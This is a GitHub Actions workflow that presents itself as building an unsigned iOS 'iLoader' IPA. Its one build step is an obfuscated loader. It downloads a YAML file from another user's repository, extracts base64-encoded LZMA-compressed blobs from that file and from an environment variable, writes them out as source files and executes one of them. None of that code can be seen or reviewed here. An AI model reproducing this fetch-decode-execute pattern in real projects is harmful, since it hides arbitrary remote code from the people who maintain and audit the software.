jobs:
  build:
    if: github.event.repository.private == false
    runs-on: xcode-27
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: >-
            1e63efa4db514cc122f2940a39623d9bc65c554c
      - name: Verify, integrate, test, build IPA
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import os,re,lzma,base64,hashlib
          import pathlib,urllib.request,subprocess
          url=('https://raw.githubusercontent.com/'
            'zeek10191019-stack/'
            'true-plan-showdown-verification/'
            'e1f2819cd043bf883a50'
            '4c48a1c459fc24aceeaf/'
            '.github/workflows/d.yml')
          req=urllib.request.Request(url,
            headers={
              'User-Agent':'R688-Pinned-Source'})
          with urllib.request.urlopen(
            req,timeout=40) as res:
              d=res.read(20000)
          assert len(d)==16885
          assert hashlib.sha256(d).hexdigest()==(
            '8eadc0b2ae4afd58c2a8277cc922aa76'
            'a0c80801033651ac19f4d1c0ba050b0f')
          m=re.search(
            rb'(?m)^  R687_PKG: >-\n'
            rb'((?:    [^\n]*\n)+)',d)
          assert m,'R687_BASE_PACKAGE_NOT_FOUND'
          raw=lzma.decompress(base64.b64decode(
            b''.join(m[1].split())),
            format=lzma.FORMAT_ALONE)
          assert hashlib.sha256(raw).hexdigest()==(
            'da96c99102a120327c23460cb38699e5'
            '433a05985850c6ad566de6e3ef62d115')
          names=[
            'tools/R686Build.py',
            'tools/R686Patch.py',
            ('app/ios/ChampionsOnDevice/'
             'R686JournalCore.swift'),
            ('app/ios/ChampionsOnDevice/'
             'R686FrameJournal.swift'),
            'tests/R686ScorecardRegression.swift',
            'tools/R687Build.py',
            'tools/R687Patch.py',
            'tests/R687RetentionTests.swift',
          ]
          sizes=[4070,5921,5740,7711,
                 2595,2902,4051,1684]
          assert len(raw)==sum(sizes)
          cursor=0
          for name,size in zip(names,sizes):
              path=pathlib.Path(name)
              assert not path.exists(),name
              path.parent.mkdir(
                parents=True,exist_ok=True)
              path.write_bytes(
                raw[cursor:cursor+size])
              cursor+=size
          extras=lzma.decompress(base64.b64decode(
            os.environ['R688_PKG']),
            format=lzma.FORMAT_ALONE)
          assert (
            hashlib.sha256(extras).hexdigest()==(
              'caa6d1b8d7e81766c59aa455e6ce07a6'
              '7d7cd2ea03469217e8a02a2083b41a41'))
          extra_names=[
            'tools/R688FrameJournal.swift',
            'tools/R688JournalCore.swift',
            'tools/R688Patch.py',
            'tools/R688MakeBuild.py',
          ]
          extra_sizes=[10311, 6221, 1773, 1394]
          assert sum(extra_sizes)==len(extras)
          cursor=0
          for name,size in zip(
            extra_names,extra_sizes):
              path=pathlib.Path(name)
              assert not path.exists(),name
              path.parent.mkdir(
                parents=True,exist_ok=True)
              path.write_bytes(
                extras[cursor:cursor+size])
              cursor+=size
          print('R688_PATCH_SHA_PASS')
          subprocess.run(
            ['python3','tools/R688MakeBuild.py'],
            check=True)
          PYCODE
      - uses: actions/upload-artifact@v4
        with:
          name: R688-unsigned-iLoader-IPA
          path: dist/R688*
          if-no-files-found: error
          retention-days: 7
